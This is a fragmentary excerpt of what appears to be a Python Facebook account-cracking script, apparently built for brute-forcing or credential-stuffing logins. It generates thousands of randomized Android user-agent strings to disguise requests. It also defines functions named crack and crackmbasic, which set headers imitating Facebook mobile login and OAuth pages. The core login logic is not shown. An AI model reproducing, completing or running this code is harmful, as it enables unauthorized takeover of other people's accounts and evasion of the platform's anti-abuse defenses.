...
for xd in range(10000):
	...
	uaku=f'Mozilla/5.0 (Linux; Android 10 {a}; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{c}.0.{d}.{e} Mobile Safari/537.36'
	ugen2.append(uaku)
...
for t in range(10000):
	...
	d=random.randrange(4200,4900)
	e=random.randrange(40,150)
	brayen1=f'Mozilla/5.0 (Linux; Android 5.1.1 {a}; SAMSUNG SM-J200H Build/LMY48B){b} AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/3.5 Chrome/{c}.0.{d}.{e} Mobile Safari/537.36'
	brayen2=f'Mozilla/5.0 (Linux; Android 13 {a}; Infinix X678B Build/TP1A.{b}.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{c}.0.{d}.{e} Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/437.0.0.35.116;]'
	brayen3=f'Mozilla/5.0 (Linux; Android 10 {a}; CPH8686 Build/OPM1.{b}.448; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{c}.0.{d}.{e} Mobile Safari/537.36'
	brayen4=f'Mozilla/5.0 (Linux; Android 10 {a}; CPH9929 Build/OPM1.{b}.066; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{c}.0.{d}.{e} Mobile Safari/537.36'
...
def crack(idf,pwv):
    ...
    'sec-fetch-mode': 'cors',
    'sec-fetch-dest': 'empty',
    'referer': 'https://m.facebook.com/login/?email=100093508740794&app_id=141595129234543&api_key=141595129234543&auth_token=52bd2a601339bf9aa924c3212f68af67&next=https%3A%2F%2Fm.facebook.com%2Fv20.0%2Fdialog%2Foauth%3Fclient_id%3D141595129234543%26redirect_uri%3Dhttps%253A%252F%252Fibispaint.com%252Flogin.jsp%26display%3Dpopup%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dc833a369-004b-4df5-9429-6df761b094fc%26tp%3Dunspecified&li=asZcZucf205G1YHg8dWaZNar&cancel=https%3A%2F%2Fibispaint.com%2Flogin.jsp%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%23_%3D_&e=1647001&skip_api_login=1&shbl=1&locale2=id_ID&wtsid=rdr_0Y8ZXYNvvQF5Ro20u&refsrc=deprecated&_rdr',
    'accept-encoding': 'gzip, deflate, br',
    'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
...
def crackmbasic(idf,pwv):
    ...
    'referer': 'https://mbasic.facebook.com/login.php?next=https%3A%2F%2Fmbasic.facebook.com%2Flogin%2Fdevice-based%2Fvalidate-password&refsrc=deprecated',
